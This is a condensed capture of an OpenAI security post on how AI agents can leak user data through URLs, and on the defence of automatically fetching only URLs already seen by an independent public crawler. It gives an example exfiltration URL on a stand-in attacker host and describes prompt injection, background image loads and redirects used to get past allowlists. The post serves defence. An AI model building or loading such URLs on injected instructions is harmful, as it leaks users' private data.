# Keeping your data safe when an AI agent clicks a link — OpenAI (Security) (raw capture)

> Source: https://openai.com/index/ai-agent-link-safety/
> Publisher: OpenAI (Security) · Date: 2026-01-28
> Captured: 2026-10-12 via built-in browser (get_page_text) (condensed).

Authors: Adrian Spânu, Thomas Shadwell. Tags on page: Safety, Security.

## Intro

Agents open pages, follow links, and load images. The post covers one attack
class: **URL-based data exfiltration**, and the safeguards ChatGPT and agentic
experiences use when fetching web content.

## The problem: a URL can carry more than a destination

- Requesting a URL sends the URL itself to the site, which commonly logs it.
- An attacker can trick a model into requesting a URL that embeds private data
  (an email address, a document title), for example
  `https://attacker.example/collect?data=<something private>`, then read it from
  server logs.
- The request can happen in the background (an embedded image, a link preview),
  so the user may never notice.
- Prompt injection in web content can drive this. Even if the model says nothing
  sensitive in chat, a forced URL load can leak data.

## Why simple "trusted site lists" aren't enough

- Allowing only well-known sites helps but is incomplete.
- **Redirects:** a link can start on a trusted domain and forward to an
  attacker destination; a check on the first domain misses it.
- **User experience:** rigid allowlists cause frequent warnings and false
  alarms, which train people to click through prompts without thinking.
- Target property instead: not "this domain seems reputable" but "this exact
  URL is safe to fetch automatically".

## Our approach: allow automatic fetching only for URLs that are already public

- Principle: a URL already known to exist publicly, independent of any user's
  conversation, is much less likely to contain that user's private data.
- An **independent web index (crawler)** records public URLs with no access to
  user conversations, accounts, or personal data.
- Before an automatic fetch, the system checks whether the exact URL matches one
  the index has seen.
  - Match: the agent may load it automatically (open an article, render a
    public image).
  - No match: treated as unverified. Either the agent is told to try a
    different site, or explicit user action is required behind a warning.
- The question shifts from "do we trust this site?" to "has this specific
  address appeared publicly in a way that does not depend on user data?"

## What you might see as a user

Warning text along the lines of: the link isn't verified; it may include
information from your conversation; make sure you trust it before proceeding.
Advice: if something looks off, do not open it; ask the model for another
source or a summary.

## What this protects against and what it doesn't

- Guarantee targeted: the agent cannot quietly leak user-specific data **through
  the URL itself** when fetching resources.
- Not guaranteed: that page content is trustworthy; that a site will not
  socially engineer the user; that a page holds no misleading or harmful
  instructions; that browsing is safe in every sense.
- Hence one layer in defense in depth with model-level injection mitigations,
  product controls, monitoring, and ongoing red-teaming. OpenAI monitors for
  evasion and treats this as an ongoing engineering problem.

## Looking ahead

Safety means handling gray areas with transparent controls and strong defaults,
not only blocking bad destinations. Invites responsible disclosure; links a
paper with full technical details.
